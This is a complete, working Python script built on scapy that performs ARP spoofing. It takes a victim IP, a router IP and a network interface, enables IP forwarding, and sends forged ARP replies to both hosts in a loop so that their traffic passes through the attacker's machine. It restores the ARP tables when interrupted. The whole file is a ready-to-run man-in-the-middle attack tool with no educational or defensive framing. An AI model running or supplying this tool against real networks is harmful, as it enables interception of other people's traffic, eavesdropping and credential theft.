
#!/usr/bin/python3

from scapy.all import Ether, ARP, send, srp, get_if_addr
from argparse import ArgumentParser
from os import getuid, system 
from time import sleep


def takeArguments():
    """
        Takes the commande line arguments and returns it to the main()
    """
    # Object of ArgumentParser() for handling the CLI Aruguments
    parser = ArgumentParser(description="It continuously sends ARP requests to the victim IP and Router.")

    # List of arguments
    parser.add_argument(
        "-v",
        "--victim",
        type=str,
        help="set the IP address of the victim/target.",
        required = True
    )
    parser.add_argument(
        "-r",
        "--router",
        type=str,
        help="set the IP address of the router/gateway.",
        required = True
    )
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        help="set the interface to start ARP spoofing.",
        required = True
    )

    # Parse and return the arguments
    return parser.parse_args()

def get_mac(ip):
    """
        This function returns the MAC address of the IP address
    """

    brodcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst = ip)
    
    reply = srp(brodcast, timeout = 1, verbose = False)[0]
    mac = reply[0][1].hwsrc                                

    if mac == None:
        exit(f"[!] Unable to find the MAC address of the {ip}")
    
    return mac

def spoof(target_ip, spoof_ip, interface):
    """
        It will send the fake ARP packets to the victim/target and router
    """

    packet = ARP(
        op = 2, 
        pdst = target_ip,
        hwdst = get_mac(target_ip),
        psrc = spoof_ip
    )

    send(packet, iface=interface, verbose = False)
    print(f"[*] Spoofed packet sent to {target_ip}")


def restore(original_ip, spoofed_ip, interface):
    """
        It will restore the original MAC for the victim IP on ARP table
    """

    packet = ARP(
        op = 2, 
        pdst = original_ip,
        hwdst = get_mac(original_ip),
        psrc = spoofed_ip,
        hwsrc = get_mac(spoofed_ip)
    )

    send(packet, iface=interface, verbose = False)


def main(args):
    if(getuid() != 0):
        exit("[!] Run this script as a root!!!\n[!] Exiting...")

    # Unable port forwarding
    system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    sentPackets = 0
    myip = get_if_addr(args.interface)

    try:
        print("Sending fake ARP packets to the target and router...")

        while True:
            spoof(args.victim, args.router, args.interface)
            spoof(args.router, args.victim, args.interface)
            sentPackets += 2
            print(f"[+] {args.victim}(target) <——> {myip}(you) <——> {args.router}(router \t Total: {sentPackets}")

    except KeyboardInterrupt:
        print("[!] Keyboard Interupt:")
        print(f"[*] Total spoofed packet sent: {sentPackets}")
        sleep(1)
        restore(args.victim, args.router, args.interface)
        restore(args.router, args.victim, args.interface)
        # Disable port forwarding       
        system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        exit("[-] Exiting...")

    except IndexError:
        print(f"arpspoof: couldn't arp for host: {args.victim} or router: {args.router}")
        print("[!] Unable to reach victim, check if you have entered wrong IP address for victim or router/gateway")
        sleep(1)
        exit("Exiting...")

    except Exception as e:
        print(f"Error: {e}")
        print("[!] Something went wrong!")
        exit("[!] Unable to send the packet!")


main(takeArguments())
